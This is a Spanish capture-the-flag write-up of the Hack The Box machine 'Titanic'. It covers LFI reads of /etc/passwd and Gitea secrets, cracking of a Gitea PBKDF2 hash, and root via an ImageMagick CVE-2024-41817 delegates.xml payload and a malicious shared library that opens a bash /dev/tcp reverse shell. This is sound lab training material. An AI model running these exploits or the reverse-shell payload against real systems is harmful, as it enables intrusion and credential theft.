---
title: Titanic - Easy (HTB)
permalink: /Titanic-HTB-Writeup/
tags:
  - "Linux"
  - "Medium"
  - "Local File Inclusion"
  - "SQLite"
  - "Gitea"
  - "Hash Cracking"
  - "PBKDF2"
  - "ImageMagick"
  - "CVE-2024-41817"
categories:
  - writeup
  - hacking
  - hackthebox
  - "hacking web"
toc: true
toc_label: Topics
toc_sticky: true
sidebar:
  - main
seo_tittle: Titanic - Easy (HTB)
seo_description: Aprende explotación de Local File Inclusion para obtener una base de datos de Gitea. Explota un CVE en el servicio ImageMagic para vencer Titanic.
excerpt: Aprende explotación de Local File Inclusion para obtener una base de datos de Gitea. Explota un CVE en el servicio ImageMagic para vencer Titanic.
header:
  overlay_image: /assets/images/headers/titanic-hackthebox.jpg
  overlay_filter: 0.7
  og_image: /assets/images/headers/titanic-hackthebox.jpg
---
![image-center](/assets/images/posts/titanic-hackthebox.png)
{: .align-center}

**Habilidades:** Local File Inclusion, SQLite Database Analysis, Cracking `Gitea` Hashes - `PBKDF2`, `ImageMagick` Arbitrary Code Execution (CVE-2024-41817)
{: .notice--primary}

# Introducción

Titanic es una máquina Linux de dificultad `Easy` en HackTheBox donde aprenderemos explotación web via LFI (Local File Inclusion) a un endpoint vulnerable. Descubriremos un servicio interno, y desencriptaremos un hash del algoritmo `PBKDF2-HMAC-SHA256` para obtener acceso inicial. Explotaremos CVE-2024-41817 (vulnerabilidad en `ImageMagick`) para elevar nuestros privilegios y vencer Titanic. 
<br>
# Reconocimiento
---
Enviaremos una traza ICMP para comprobar que la máquina víctima se encuentre activa

~~~ bash
ping -c 1 10.10.11.55
PING 10.10.11.55 (10.10.11.55) 56(84) bytes of data.
64 bytes from 10.10.11.55: icmp_seq=1 ttl=63 time=244 ms

--- 10.10.11.55 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 243.611/243.611/243.611/0.000 ms
~~~


## Nmap Scanning 

Haremos un escaneo de puertos para identificar servicios expuestos. Primeramente solo nos interesa ver puertos abiertos en el protocolo TCP, de lo contrario aplicaremos otros métodos de escaneo

~~~ bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.11.55 -oG openPorts
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-20 22:15 EDT
Nmap scan report for 10.10.11.55
Host is up (0.24s latency).
Not shown: 63550 closed tcp ports (reset), 1983 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 25.24 seconds
~~~

- `--open`: Mostrar únicamente los puertos abiertos
- `-p-`: Hacer un escaneo del total de puertos **(65535)**
- `--min-rate 5000`: Enviar mínimo **5000 paquetes por segundo**
- `-n`: No aplicar **resolución DNS**, lo que acelera el escaneo
- `-sS`: Modo de **escaneo TCP SYN**, no concluye la conexión, lo que hace el escaneo más ágil
- `-Pn`: Omitir el **descubrimiento de host (ARP)**
- `-oG`: Exportar en formato `grepable`
- `-v`: Ver el progreso del escaneo

Haremos un segundo escaneo que identifique la versión y los servicios que se ejecutan en los puertos abiertos que hemos descubierto

~~~ bash
nmap -p 22,80 -sVC 10.10.11.55 -oN services                   
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-20 22:18 EDT
Nmap scan report for 10.10.11.55
Host is up (0.22s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 73:03:9c:76:eb:04:f1:fe:c9:e9:80:44:9c:7f:13:46 (ECDSA)
|_  256 d5:bd:1d:5e:9a:86:1c:eb:88:63:4d:5f:88:4b:7e:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://titanic.htb/
Service Info: Host: titanic.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.61 seconds
~~~

- `-p`: Especificar puertos
- `-sV`: Identificar la versión del servicio 
- `-sC`: Uso de scripts de reconocimiento
- `-oN`: Exportar la salida en formato normal

Identificamos dos servicios, `ssh` y `http`, donde vemos que el servidor nos intenta redirigir a `titanic.htb`, pero nuestro sistema no conoce ese nombre de dominio, por lo que será necesario agregarlo a nuestro archivo `/etc/hosts`

~~~ bash
cat /etc/hosts | grep titanic.htb

10.10.11.55 titanic.htb
~~~


## Web Analysis

Podemos escanear las tecnologías web que el servidor está ejecutando, con el objetivo de identificar algún gestor de contenido si es que se utilizara alguno como `Wordpress`, `Joomla`, etc

~~~ bash
whatweb http://titanic.htb

http://titanic.htb [200 OK] Bootstrap[4.5.2], Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/3.0.3 Python/3.10.12], IP[10.10.11.55], JQuery, Python[3.10.12], Script, Title[Titanic - Book Your Ship Trip], Werkzeug[3.0.3]
~~~

Vemos que el servidor web parece estar montada en `python`. Al visitar la web `titanic.htb`, veremos lo siguiente

![image-center](/assets/images/posts/titanic-web.png)
{: .align-center}

Al hacer clic en `Book Your Trip`, podremos rellenar el siguiente formulario para agendar un viaje. Al completar el formulario se nos descarga un archivo `.json`

![image-center](/assets/images/posts/titanic-web-2.png)
{: .align-center}


## Fuzzing

Podemos intentar descubrir rutas que no veamos a simple vista al analizar la web. Haremos solicitudes HTTP a rutas o archivos posibles utilizando un listado de palabras

~~~ bash
gobuster dir -u http://titanic.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x txt,html,php,xml,json,js ===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://titanic.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,html,php,xml,json,js
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/download             (Status: 400) [Size: 41]
/book                 (Status: 405) [Size: 153]
~~~

Si hacemos una solicitud a `download`, nos mostrará un mensaje indicando que necesitamos enviar un `ticket`

~~~ bash
curl -X GET 'http://titanic.htb/download'                                                              
{"error":"Ticket parameter is required"}
~~~
<br>


# Intrusión / Explotación
---
## Local File Inclusion

Al intentar incluir archivos comunes dentro del parámetro `ticket`, los incluye en la solicitud. Iniciaremos con ver los usuarios existentes en la máquina víctima, donde existe un usuario `developer` además del usuario `root`

~~~ bash
curl -sX GET 'http://titanic.htb/download?ticket=/etc/passwd' | grep sh$
root:x:0:0:root:/root:/bin/bash
developer:x:1000:1000:developer:/home/developer:/bin/bash
~~~

También podemos consultar el archivo `/etc/hosts` para averiguar si existen subdominios u otros hosts definidos internamente

~~~ bash
curl -X GET 'http://titanic.htb/download?ticket=/etc/hosts'     

127.0.0.1 localhost titanic.htb dev.titanic.htb
127.0.1.1 titanic

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
~~~

Existe un subdominio `dev.titanic.htb`. Lo agregaremos a nuestro archivo `/etc/hosts` para poder resolver ese nombre de dominio

~~~ bash
cat /etc/hosts | grep titanic.htb

10.10.11.55 titanic.htb dev.titanic.htb
~~~


## `Gitea` - Subdomain Analysis

Al navegar a `dev.titanic.htb` en el navegador, veremos el servicio `Gitea`

![image-center](/assets/images/posts/titanic-gitea.png)
{: .align-center}

Tenemos la capacidad de registrar usuarios desde la esquina superior derecha, nos registraremos con un nuevo usuario

![image-center](/assets/images/posts/titanic-gitea-2.png)
{: .align-center}

### Repositories

Al hacer clic en `Explore`, veremos los siguientes repositorios. **Ignora el repo de `marco`, es porque alguien ha intentado cositas y se olvidó de eliminarlo XD**

![image-center](/assets/images/posts/titanic-gitea-repos.png)
{: .align-center}

Analizando el repositorio `docker-config`, veremos desde donde se montan los archivos de `gitea`, en la ruta `/home/developer/gitea/data`

![image-center](/assets/images/posts/titanic-gitea-repos-2.png)
{: .align-center}

Aprovecharemos el LFI desde el parámetro `ticket` de antes para intentar incluir archivos desde esta ruta.

> Los archivos comunes de `Gitea` pueden encontrarse en varias ubicaciones dependiendo del contexto. El principal archivo de configuración es `app.ini`, que normalmente se encuentra en `custom/conf/` dentro del directorio de instalación de `Gitea`
{: .notice--info}

~~~ bash
gitea/conf/app.ini
~~~

Sabiendo esto, podremos consultar dicho archivo para comprobar su existencia bajo el directorio `/home/developer/gitea/data`

~~~ bash
curl -sX GET 'http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/conf/app.ini'
APP_NAME = Gitea: Git with a cup of tea
RUN_MODE = prod
RUN_USER = git
WORK_PATH = /data/gitea

[repository]
ROOT = /data/git/repositories

[repository.local]
LOCAL_COPY_PATH = /data/gitea/tmp/local-repo

[repository.upload]
TEMP_PATH = /data/gitea/uploads

[server]
APP_DATA_PATH = /data/gitea
DOMAIN = gitea.titanic.htb
SSH_DOMAIN = gitea.titanic.htb
HTTP_PORT = 3000
ROOT_URL = http://gitea.titanic.htb/
DISABLE_SSH = false
SSH_PORT = 22
SSH_LISTEN_PORT = 22
LFS_START_SERVER = true
LFS_JWT_SECRET = OqnUg-uJVK-l7rMN1oaR6oTF348gyr0QtkJt-JpjSO4
OFFLINE_MODE = true

[database]
PATH = /data/gitea/gitea.db
DB_TYPE = sqlite3
HOST = localhost:3306
NAME = gitea
USER = root
PASSWD = 
LOG_SQL = false
SCHEMA = 
SSL_MODE = disable

[indexer]
ISSUE_INDEXER_PATH = /data/gitea/indexers/issues.bleve

[session]
PROVIDER_CONFIG = /data/gitea/sessions
PROVIDER = file

[picture]
AVATAR_UPLOAD_PATH = /data/gitea/avatars
REPOSITORY_AVATAR_UPLOAD_PATH = /data/gitea/repo-avatars

[attachment]
PATH = /data/gitea/attachments

[log]
MODE = console
LEVEL = info
ROOT_PATH = /data/gitea/log

[security]
INSTALL_LOCK = true
SECRET_KEY = 
REVERSE_PROXY_LIMIT = 1
REVERSE_PROXY_TRUSTED_PROXIES = *
INTERNAL_TOKEN = eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYmYiOjE3MjI1OTUzMzR9.X4rYDGhkWTZKFfnjgES5r2rFRpu_GXTdQ65456XC0X8
PASSWORD_HASH_ALGO = pbkdf2

[service]
DISABLE_REGISTRATION = false
REQUIRE_SIGNIN_VIEW = false
REGISTER_EMAIL_CONFIRM = false
ENABLE_NOTIFY_MAIL = false
ALLOW_ONLY_EXTERNAL_REGISTRATION = false
ENABLE_CAPTCHA = false
DEFAULT_KEEP_EMAIL_PRIVATE = false
DEFAULT_ALLOW_CREATE_ORGANIZATION = true
DEFAULT_ENABLE_TIMETRACKING = true
NO_REPLY_ADDRESS = noreply.localhost

[lfs]
PATH = /data/git/lfs

[mailer]
ENABLED = false

[openid]
ENABLE_OPENID_SIGNIN = true
ENABLE_OPENID_SIGNUP = true

[cron.update_checker]
ENABLED = false

[repository.pull-request]
DEFAULT_MERGE_STYLE = merge

[repository.signing]
DEFAULT_TRUST_MODEL = committer

[oauth2]
JWT_SECRET = FIAOKLQX4SBzvZ9eZnHYLTCiVGoBtkE4y5B7vMjzz3g
~~~

### Dumping `gitea` Database

 Dentro de este directorio encontraremos la [base de datos](https://docs.gitea.com/next/help/faq#where-does-gitea-store-what-file) de `gitea`. Haremos una solicitud HTTP para descargarla en nuestro directorio actual

~~~ bash
curl -sX GET 'http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/gitea.db' -o gitea.db
~~~


## SQLite Database Analysis

Con la base de datos en nuestra máquina, debemos utilizar `sqlite3` para analizar este archivo. Primeramente listaremos las tablas

~~~ bash
sqlite3 gitea.db                                             
SQLite version 3.40.1 2022-12-28 14:03:47
Enter ".help" for usage hints.
sqlite> .tables
...
...
...
label                      upload                   
language_stat              user                     
...
...
~~~

Consultaremos rápidamente la tabla `user` usando una query como argumento, podemos usar formatos para ver la salida, en mi caso la quise ver en formato `json`

~~~ bash
sqlite3 gitea.db 'select * from user' -json | jq

[
  {
    "id": 1,
    "lower_name": "administrator",
    "name": "administrator",
    "full_name": "",
    "email": "root@titanic.htb",
    "keep_email_private": 0,
    "email_notifications_preference": "enabled",
    "passwd": "cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136",
    "passwd_hash_algo": "pbkdf2$50000$50",
    ...
    ...
    ...
~~~


## PBKDF2 Hash Cracking

Según la información de la tabla, podemos ver el algoritmo utilizado, el cual es `pbkdf2`. Es posible convertir este hash a un formato aceptado por `hashcat` con la siguiente estructura

~~~ bash
pbkdf2-sha256:$iterations:$salt:$hash
~~~

En el siguiente [artículo](https://www.unix-ninja.com/p/cracking_giteas_pbkdf2_password_hashes), podemos seguir los pasos para convertir el hash con la herramienta [gitea2hashcat.py](https://raw.githubusercontent.com/unix-ninja/hashcat/refs/heads/master/tools/gitea2hashcat.py)

~~~ bash
wget https://raw.githubusercontent.com/unix-ninja/hashcat/refs/heads/master/tools/gitea2hashcat.py
~~~

Copiaremos los datos que necesitamos, en nuestro caso, podemos directamente copiar el registro de `developer`

~~~ bash
sqlite3 gitea.db 'select salt,passwd from user where name="developer";' | xclip -sel clip
~~~

Ahora utilizaremos `gitea2hashcat.py` de la siguiente manera, esto devolverá un hash que `hashcat` puede intentar crackear

~~~ bash
python3 gitea2hashcat.py "8bf3e3452b78544f8bee9400d6936d34|e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56
"
[+] Run the output hashes through hashcat mode 10900 (PBKDF2-HMAC-SHA256)

sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=
~~~

Intentaremos crackear este hash con el modo que nos sugiere el script, el cual corresponde al algoritmo `PBKDF2-HMAC-SHA256`

~~~ bash
hashcat -m 10900 hash.txt /usr/share/wordlists/rockyou.txt -O


sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=:25282528
~~~


## Shell as `developer`

Hemos encontrado la contraseña `25282528` para el hash de `developer`, intentaremos ver si podemos conectarnos por `ssh` con estas credenciales

~~~ bash
ssh developer@titanic.htb
developer@titanic.htb\'s password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-131-generic x86_64)
...
developer@titanic:~$ 
developer@titanic:~$ export TERM=xterm
~~~

En este punto ya podremos ver la flag del usuario sin privilegios

~~~ bash
developer@titanic:~$ cat /home/developer/user.txt 
78a...
~~~
<br>


# Escalada de Privilegios
---
## Finding Privilege Escalation Vector

En este punto debemos buscar una vía por la cual podamos escalar nuestros privilegios para convertirnos en el usuario `root`. Podemos intentar enumerar algunas vías comunes, pero sin tener los resultados esperados.

### (Posible) Sudo Privileges

Podríamos comenzar listando privilegios configurados con `sudo`, esto nos permitiría ver si podemos ejecutar algún binario o script como `root` u otro usuario si existiera

~~~ bash
sudo -l
~~~

### (Posible) SUID Binaries

Otro método muy común es abusar de permisos `siud`. Podemos comprobar si existe algo que podamos utilizar 

~~~ bash
developer@titanic:/opt/app/static/assets/images$ find / -perm -4000 2>/dev/null | grep -v snap

/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/su
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/mount
/usr/bin/fusermount3
~~~


## `identify_images.sh` Script

Existe un script de `bash` en el directorio `/opt` que utiliza `magick` para guardar los metadatos de las imágenes dentro del directorio `/opt/app/static/assets/images`, en el archivo `metadata.log`

~~~ bash
developer@titanic:/opt/app$ cat /opt/scripts/identify_images.sh 
cd /opt/app/static/assets/images
truncate -s 0 metadata.log
find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log
~~~

Podemos comprobar la versión de `ImageMagick` con el parámetro `-version`

~~~ bash
developer@titanic:/opt/app/static/assets/images$ /usr/bin/magick -version

Version: ImageMagick 7.1.1-35 Q16-HDRI x86_64 1bfce2a62:20240713 https://imagemagick.org
Copyright: (C) 1999 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5) 
Delegates (built-in): bzlib djvu fontconfig freetype heic jbig jng jp2 jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
Compiler: gcc (9.4)
~~~


## `ImageMagick 7.1.1-35` Arbitrary Code Execution (CVE-2024-41817)

La versión `7.1.1-35` es vulnerable a ejecución de código a través de su forma de manejar las variables de entorno.

El problema radica cuando la ruta `$HERE/usr/lib/MagicImage-7.0.9/` no existe, por ende el comando `$(readlink -f "$HERE/usr/lib/ImageMagick-7.0.9/config-Q16")` que se utiliza dentro del script `AppRun` devolverá una ruta vacía

~~~ bash
export MAGICK_CONFIGURE_PATH=$(readlink -f "$HERE/usr/lib/ImageMagick-7.0.9/config-Q16"):$(readlink -f "$HERE/usr/lib/ImageMagick-7.0.9/config-Q16HDRI"):$(readlink -f "$HERE/usr/share/ImageMagick-7"):$(readlink -f "$HERE/usr/etc/ImageMagick-7"):$MAGICK_CONFIGURE_PATH

export LD_LIBRARY_PATH=$(readlink -f "$HERE/usr/lib"):$LD_LIBRARY_PATH|
export LD_LIBRARY_PATH=${HERE}/usr/lib/ImageMagick-7.0.9/modules-Q16HDRI/coders:$LD_LIBRARY_PATH
~~~

>El script `AppRun` configura variables como `MAGICK_CONFIGURE_PATH` y `LD_LIBRARY_PATH` para que la aplicación pueda encontrar sus archivos de configuración y bibliotecas dinámicas.
{: .notice--info}

Al no existir la ruta, el valor de `MAGICK_CONFIGURE_PATH` comenzará por `:`. Durante la ejecución de `magick`, se buscará librerías en el directorio actual, y es aquí cuando podríamos intentar definir una librería compartida maliciosa o un archivo `delegates.xml`

~~~ bash
developer@titanic:/tmp/.mount_magick4ANRra$ echo $MAGICK_CONFIGURE_PATH
::/usr/share/ImageMagick-7::::/tmp/.mount_magick4ANRra/usr/share/ImageMagick-7:/tmp/.mount_magick4ANRra/usr/etc/ImageMagick-7:

developer@titanic:/tmp/.mount_magick4ANRra$ echo $LD_LIBRARY_PATH
/tmp/.mount_magick4ANRra/usr/lib/ImageMagick-7.0.9/modules-Q16HDRI/coders:/tmp/.mount_magick4ANRra/usr/lib:
~~~

> El archivo `delegates.xml` en `ImageMagick` es un archivo de configuración que **define cómo `ImageMagick` interactúa con herramientas externas** (delegados) para procesar ciertos formatos de archivo
{: .notice--info}

Habiendo entendido cómo podríamos explotar esta vulnerabilidad, podemos seguir dos métodos para ejecutar comandos

### Proof of Concept - `delegates.xml` File

El primer método consiste en crear un archivo `delegates.xml` en el directorio donde busca el script `identify_images.sh`

~~~ bash
developer@titanic:/opt/app/static/assets/images$ cat << EOF > ./delegates.xml
<delegatemap><delegate xmlns="" decode="XML" command="id"/></delegatemap>
EOF
~~~

Esto ejecutará el comando `id`, y como el script guarda los metadatos de las imágenes que enviamos en el archivo `metadata.log`, deberíamos ver la salida del comando ejecutado allí. Por alguna razón solo funciona cuando el archivo vuelve a crearse, por lo que lo eliminaremos

~~~ bash
developer@titanic:/opt/app/static/assets/images$ touch 'delegates.xml .jpg'
developer@titanic:/opt/app/static/assets/images$ rm metadata.log
~~~

> Hemos creado un archivo `delegates.xml .jpg`, para que se ejecute necesita tener con espacios la extensión `.jpg`.
{: .notice--warning}

Cuando eliminemos el archivo `.log`, esperaremos unos segundos y se creará nuevamente, con la salida del comando `id` en la primer línea

~~~ bash
developer@titanic:/opt/app/static/assets/images$ cat metadata.log 
uid=0(root) gid=0(root) groups=0(root)
/opt/app/static/assets/images/luxury-cabins.jpg JPEG 1024x1024 1024x1024+0+0 8-bit sRGB 280817B 0.000u 0:00.003
/opt/app/static/assets/images/entertainment.jpg JPEG 1024x1024 1024x1024+0+0 8-bit sRGB 291864B 0.000u 0:00.000
/opt/app/static/assets/images/home.jpg JPEG 1024x1024 1024x1024+0+0 8-bit sRGB 232842B 0.000u 0:00.000
/opt/app/static/assets/images/exquisite-dining.jpg JPEG 1024x1024 1024x1024+0+0 8-bit sRGB 280854B 0.000u 0:00.000
~~~

### Exploiting via Shared Library - `libxcb.so.1`

Para el segundo método, compilaremos una biblioteca compartida maliciosa que ejecute un comando en el sistema. En este caso enviaremos una reverse shell a nuestro equipo por un puerto

~~~ bash
developer@titanic:/opt/app/static/assets/images$ gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF  
#include <stdio.h>  
#include <stdlib.h>  
#include <unistd.h>  
__attribute__((constructor)) void init(){  
    system("bash -c 'bash -i >& /dev/tcp/10.10.14.16/4444 0>&1'");  
    exit(0);  
}  
EOF
~~~

Iniciaremos un `listener` desde nuestra máquina atacante a la espera de la conexión

~~~ bash
nc -lvnp 4444
listening on [any] 4444 ...
~~~

Al cabo de unos momentos obtendremos una consola como `root`

~~~ bash
connect to [10.10.14.16] from (UNKNOWN) [10.10.11.55] 58226
bash: cannot set terminal process group (441356): Inappropriate ioctl for device
bash: no job control in this shell
root@titanic:/opt/app/static/assets/images# id
id
uid=0(root) gid=0(root) groups=0(root)
root@titanic:/opt/app/static/assets/images# 
~~~

Ya podremos ver la flag en el directorio `/root` para concluir la máquina

~~~ bash
root@titanic:~# cat ~/root.txt
cfb...
~~~
<br>
Gracias por leer este artículo, espero te haya sido de ayuda. Te dejo la cita del día:

> A subtle thought that is in error may yet give rise to fruitful inquiry that can establish truths of great value.
> — Isaac Asimov
{: .notice--info}
